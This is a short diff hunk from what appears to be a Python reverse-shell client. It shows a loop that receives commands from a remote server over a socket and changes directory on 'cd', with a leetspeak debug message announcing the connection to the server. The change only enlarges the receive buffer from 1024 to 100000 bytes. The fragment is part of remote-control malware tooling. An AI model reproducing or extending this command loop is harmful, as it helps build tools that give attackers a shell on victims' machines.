@@ -29,7 +29,7 @@ try_connect()
 while True:
     try:
         #print("[i] W3 463 N0W C0NN3C73D 70 7H3 S36V36!") # Debug only
-        cmd = s.recv(1024)
+        cmd = s.recv(100000)
         if cmd[:2] == 'cd':
             os.chdir(cmd[3:])
             dir = os.getcwd()
